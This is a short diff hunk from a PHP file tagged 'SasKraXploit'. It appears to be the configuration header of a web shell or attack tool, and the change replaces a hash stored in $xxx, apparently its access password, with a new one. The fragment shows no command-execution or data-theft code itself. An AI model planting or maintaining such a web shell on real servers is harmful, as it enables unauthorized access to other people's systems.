@@ -8,7 +8,7 @@ date_default_timezone_set("Asia/Jakarta");
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$xxx = "8a2f3a87f72b094c1834f15f8fbc8ce9";///SasKraXploit
+$xxx = "10d87ee272f367cad5bbe77754183cca";///SasKraXploit
 if(get_magic_quotes_gpc()) {  
 function VEstripslashes($array) {     
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
